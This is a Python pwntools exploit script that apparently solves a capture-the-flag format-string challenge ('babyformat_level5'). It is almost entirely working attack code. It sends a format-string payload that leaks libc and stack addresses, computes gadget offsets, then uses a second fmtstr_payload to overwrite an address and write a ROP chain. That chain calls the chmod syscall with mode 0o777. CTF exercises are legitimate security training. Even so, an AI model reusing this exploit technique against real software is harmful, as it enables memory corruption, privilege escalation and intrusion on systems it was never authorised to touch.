
from pwn import *

## working code
# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level5')
context.arch = 'amd64'
context.terminal = ["tmux", "splitw", "-h"]

def start(argv=[], *a, **kw):
    '''Start the exp against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    exp GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()


exp = f"%3$lx %150$p %04199001d%27$lnAA"
payload = exp.encode() + p64(0x404060)
io.sendline(payload)
io.recvuntil(b"Your input is:")
io.recvline()
leak_bytes = io.recvline(keepends=False)
leak = leak_bytes.decode().split(' ')
leaked_libc_func_int = int(leak[0], 16)
base = leaked_libc_func_int - 0x10e077
leaked_rbp = leak[1]
rbp_main = int(leaked_rbp, 16)
rbp_func = rbp_main - 80 
leaked_ret = rbp_func + 8
rsp_func=rbp_func-1152 
func2_rbp = rbp_func - (1*1168) 
rsp=rsp_func - (1*1168)
pop_rdi = 0x23b6a
pop_rsi = 0x2601f 
pop_rdx = 0x142c92 
pop_rax = 0x36174  
syscall = 0x2284d  

final_payload = b"a"*7 + fmtstr_payload(24, {
    0x404060 : p64(base+0x578c8).ljust(8, b"\x00"),
    rsp : p64(base + pop_rdi).ljust(8, b"\x00"),
    rsp + 8 : p64(base + 0x1eb1f3).ljust(8, b"\x00"),
    rsp + 16 : p64(base + pop_rsi).ljust(8, b"\x00"),
    rsp + 24 : p64(0o777),
    rsp + 32 : p64(base + pop_rdx).ljust(8, b"\x00"),
    rsp + 40 : p64(0),
    rsp + 48 : p64(base + pop_rax).ljust(8, b"\x00"),
    rsp + 56 : p64(0x5a),
    rsp + 64 : p64(base + 0x2284d).ljust(8, b"\x00")
    }, numbwritten=48, write_size='short', strategy='fast')

io.sendline(final_payload)
io.interactive()

